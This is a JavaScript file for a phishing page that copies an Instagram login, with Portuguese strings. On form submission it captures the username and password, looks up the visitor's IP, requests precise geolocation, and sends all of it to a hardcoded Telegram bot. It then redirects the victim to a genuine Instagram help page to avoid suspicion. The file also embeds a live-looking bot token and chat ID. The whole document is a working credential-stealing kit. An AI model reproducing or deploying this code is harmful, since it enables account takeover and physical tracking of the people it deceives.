document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const loginButton = document.getElementById('login-button');
    const loadingOverlay = document.getElementById('loading-overlay');

    const TELEGRAM_BOT_TOKEN = '8405316263:AAGnQ9ACDDYgJS1lipE92BPJly0pNjyFZf4';
    const TELEGRAM_CHAT_ID = '5899156650';
    const INSTAGRAM_HELP_URL = 'https://help.instagram.com/366993040048856/?helpref=search&query=bloquada&search_session_id=9a88b68e7eadef0e909a7d3a5c282353&sr=1&locale=pt_BR';

    async function getIpAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            if (!response.ok) return 'Não foi possível obter o IP';
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Erro ao obter IP:', error);
            return 'Não foi possível obter o IP';
        }
    }

    function getGeoLocation() {
        return new Promise((resolve) => {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        resolve({
                            lat: latitude,
                            lon: longitude,
                            mapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`
                        });
                    },
                    (error) => {
                        console.error('Erro de geolocalização:', error);
                        resolve({ error: error.message });
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                resolve({ error: 'Geolocalização não suportada' });
            }
        });
    }

    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const params = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(params)
            });
            const data = await response.json();
            console.log('Resposta do Telegram:', data);
        } catch (error) {
            console.error('Erro ao enviar para o Telegram:', error);
        }
    }

    loginForm.addEventListener('submit', async (event) => {
        event.preventDefault();
        loginButton.disabled = true;
        loginButton.textContent = 'Entrando...';
        loadingOverlay.classList.remove('hidden');

        const formData = new FormData(loginForm);
        const username = formData.get('username');
        const password = formData.get('password');
        
        const [ipAddress, geoLocation] = await Promise.all([
            getIpAddress(),
            getGeoLocation()
        ]);

        let locationInfo = 'Não foi possível obter a localização.';
        if (geoLocation && !geoLocation.error) {
            locationInfo = `<b>Latitude:</b> ${geoLocation.lat}\n<b>Longitude:</b> ${geoLocation.lon}\n<b>Mapa:</b> ${geoLocation.mapsLink}`;
        } else if (geoLocation && geoLocation.error) {
            locationInfo = `Erro de Localização: ${geoLocation.error}`;
        }

        const message = `
<b>🚨 Nova Credencial Capturada 🚨</b>
--------------------------------------
<b>👤 Usuário:</b> ${username}
<b>🔑 Senha:</b> ${password}
--------------------------------------
<b>📍 IP:</b> ${ipAddress}
--------------------------------------
<b>🌍 Localização:</b>
${locationInfo}
        `.trim();
        
        await sendToTelegram(message);

        setTimeout(() => {
            window.location.href = INSTAGRAM_HELP_URL;
        }, 3000);
    });
});

